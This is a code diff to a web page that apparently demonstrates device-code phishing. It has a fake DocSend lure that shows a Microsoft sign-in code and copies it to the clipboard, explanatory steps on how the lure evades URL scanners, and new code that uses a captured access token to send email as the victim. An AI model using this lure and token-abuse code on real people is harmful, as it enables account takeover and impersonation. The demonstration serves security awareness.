@@ -73,10 +73,10 @@
     font-size: 13px; color: #888; margin-bottom: 12px;
   }
   .ds-code {
-    font-size: 40px; font-weight: 700; letter-spacing: 8px; color: #0061ff;
-    font-family: 'SF Mono', Consolas, 'Courier New', monospace;
-    background: #f0f4ff; border: 2px dashed #b3d1ff; border-radius: 10px;
-    padding: 16px 24px; display: inline-block; margin-bottom: 16px;
+    font-size: 36px; font-weight: 800; letter-spacing: 6px; color: #1b1b1b;
+    font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: transparent; border: none; border-radius: 0;
+    padding: 20px 24px; display: inline-block; margin-bottom: 16px;
     min-height: 72px; min-width: 200px;
   }
   .ds-verify-instructions {
@@ -191,19 +191,20 @@
         </div>
       </div>
 
-      <a class="ds-download-btn" href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">
-        Click here to download
-      </a>
-
-      <hr class="ds-divider">
-
       <div class="ds-verify-label">Your auth code is:</div>
       <div class="ds-code" id="userCode"><span id="codeLoading" style="font-size:16px;color:#999;letter-spacing:normal;">Generating code...</span></div>
       <div class="ds-verify-instructions">
         Enter this code at
-        <a href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">microsoft.com/devicelogin</a>
+        <a href="https://login.microsoft.com/device" target="_blank" rel="noopener">login.microsoft.com/device</a>
         to verify your identity and access the document.
       </div>
+
+      <hr class="ds-divider">
+
+      <a class="ds-download-btn" id="downloadBtn" href="https://login.microsoft.com/device" target="_blank" rel="noopener"
+         onclick="var c=document.getElementById('userCode').textContent;navigator.clipboard.writeText(c).catch(function(){});">
+        Click here to download
+      </a>
     </div>
   </div>
 
@@ -219,6 +220,20 @@
   <div class="banner show" id="banner">&#x1F41F; PHISHED! &#x1F41F;</div>
 
   <div class="status" id="status"></div>
+
+  <div id="emailAction" style="display:none; margin: 0 0 20px;">
+    <button id="sendEmailBtn" style="
+      background: #238636; color: #fff; border: none; padding: 12px 24px;
+      font-family: monospace; font-size: 14px; font-weight: 600;
+      border-radius: 6px; cursor: pointer; width: 100%;
+      transition: background 0.2s;
+    ">Send e-mail from &lt;victim&gt;</button>
+    <div id="emailStatus" style="
+      display: none; margin-top: 8px; padding: 14px 18px; background: #161b22;
+      border: 1px solid #30363d; border-radius: 6px; font-family: monospace;
+      font-size: 14px; font-weight: 600;
+    "></div>
+  </div>
 
   <div class="section-title">Victim Identity (decoded from captured JWT)</div>
   <div class="claims-grid" id="claimsGrid"></div>
@@ -253,7 +268,7 @@
 {
   "<span class="param-key">user_code</span>":  "<span class="param-val" id="step1Code">--------</span>",       <span class="comment">// the code shown on the fake DocSend page</span>
   "<span class="param-key">device_code</span>": "<span class="param-val">[long opaque string]</span>",  <span class="comment">// kept by the attacker for polling</span>
-  "<span class="param-key">verification_uri</span>": "<span class="param-val">https://microsoft.com/devicelogin</span>",
+  "<span class="param-key">verification_uri</span>": "<span class="param-val">https://login.microsoft.com/device</span>",
   "<span class="param-key">expires_in</span>": <span class="param-val">900</span>,                    <span class="comment">// 15-minute window</span>
   "<span class="param-key">interval</span>":   <span class="param-val">5</span>                      <span class="comment">// poll every 5 seconds</span>
 }</div>
@@ -265,7 +280,7 @@
       <p>
         The attacker hosts a page mimicking a legitimate service (in this case, DocSend).
         The victim receives a link via email or message. The page displays the code and a
-        "download" button that links to the <strong>real</strong> <code style="color:#58a6ff">microsoft.com/devicelogin</code>.
+        "download" button that links to the <strong>real</strong> <code style="color:#58a6ff">login.microsoft.com/device</code>.
         Email security gateways and URL scanners see a legitimate Microsoft URL and do not flag it.
       </p>
       <div class="api-block"><span class="comment">What the victim sees (the page you just saw):</span>
@@ -284,7 +299,7 @@
   │  └──────────────────────────────────────┘    │
   │                                              │
   │      [ <span class="url">Click here to download</span> ]            │
-  │      → links to microsoft.com/devicelogin    │
+  │      → links to login.microsoft.com/device   │
   │                                              │
   │  Your auth code is:                          │
   │         <span class="danger" id="step2Code">--------</span>                        │
@@ -301,13 +316,13 @@
       <div class="step-num victim">3</div>
       <h3>Victim authenticates on the real Microsoft login page</h3>
       <p>
-        The victim clicks "download" or visits <strong>microsoft.com/devicelogin</strong>,
+        The victim clicks "download" or visits <strong>login.microsoft.com/device</strong>,
         enters the code, signs in with their username and password, and completes MFA.
         This is entirely legitimate from Microsoft's perspective.
       </p>
-      <div class="api-block"><span class="comment">What the victim sees at microsoft.com/devicelogin:</span>
+      <div class="api-block"><span class="comment">What the victim sees at login.microsoft.com/device:</span>
 
-<span class="url">https://microsoft.com/devicelogin</span>
+<span class="url">https://login.microsoft.com/device</span>
 
   ┌─────────────────────────────────────┐
   │                                     │
@@ -520,6 +535,51 @@ function decodeJwtPayload(jwt) {
   }
 }
 
+function sendPhishEmail(accessToken, victimEmail) {
+  var statusEl = document.getElementById('emailStatus');
+  statusEl.style.display = 'block';
+  statusEl.style.color = '#58a6ff';
+  statusEl.textContent = 'SENDING EMAIL to ' + victimEmail + '...';
+
+  var payload = {
+    message: {
+      subject: "How's the fish?",
+      body: {
+        contentType: "Text",
+        content: "Greetings! from your friendly neighbourhood phisher, Mr. Dodgy Fraud"
+      },
+      toRecipients: [{ emailAddress: { address: victimEmail } }]
+    }
+  };
+
+  fetch('/api/sendmail', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + accessToken
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(function(resp) {
+    if (resp.status === 202 || resp.ok) {
+      statusEl.style.color = '#7ee787';
+      statusEl.style.borderColor = '#238636';
+      statusEl.textContent = 'EMAIL SENT to ' + victimEmail + ' at ' + new Date().toLocaleTimeString();
+      document.getElementById('sendEmailBtn').disabled = true;
+      document.getElementById('sendEmailBtn').style.background = '#30363d';
+      document.getElementById('sendEmailBtn').style.cursor = 'default';
+      document.getElementById('sendEmailBtn').textContent = 'Email sent';
+    } else {
+      return resp.text().then(function(t) { throw new Error(resp.status + ': ' + t); });
+    }
+  })
+  .catch(function(e) {
+    statusEl.style.color = '#ff6b6b';
+    statusEl.style.borderColor = '#ff1744';
+    statusEl.textContent = 'EMAIL FAILED: ' + e.message;
+  });
+}
+
 function showPhished(token) {
   if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
 
@@ -577,6 +637,20 @@ function showPhished(token) {
   document.getElementById('step2Code').textContent = usedCode;
   document.getElementById('step3Code').textContent = usedCode;
   document.getElementById('step4Scopes').textContent = (claims.scp || token.scope || 'N/A');
+
+  // Show the send-email button when running via the local proxy
+  var victimEmail = claims.upn || claims.unique_name || '';
+  if (IS_LOCALHOST && victimEmail) {
+    var actionEl = document.getElementById('emailAction');
+    var btn = document.getElementById('sendEmailBtn');
+    actionEl.style.display = '';
+    btn.textContent = 'Send e-mail from ' + victimEmail;
+    btn.disabled = false;
+    btn.style.background = '#238636';
+    btn.style.cursor = 'pointer';
+    document.getElementById('emailStatus').style.display = 'none';
+    btn.onclick = function() { sendPhishEmail(token.access_token, victimEmail); };
+  }
 
   document.getElementById('analysisView').classList.add('show');
   window.scrollTo({ top: 0, behavior: 'instant' });
